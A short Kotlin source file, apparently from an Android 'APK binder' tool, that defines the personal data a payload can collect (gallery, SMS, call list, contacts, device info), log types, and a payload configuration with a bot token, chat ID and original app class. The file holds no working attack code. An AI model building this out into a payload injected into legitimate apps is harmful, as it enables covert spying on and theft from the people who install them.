package Com.devhs.apkbinder.data

enum class Feature(val key: String, val label: String) {
    GALLERY("gallery", "Gallery"),
    SMS("sms", "SMS"),
    CALLS("calls", "Call List"),
    CONTACTS("contacts", "Contacts"),
    DEVICE("device", "Device Info")
}

enum class LogLevel { INFO, SUCCESS, WARN, ERROR }

data class LogLine(val level: LogLevel, val message: String, val stamp: String)

data class PayloadConfig(
    val token: String,
    val chatId: String,
    val features: List<String>,
    val originalAppClass: String?
)
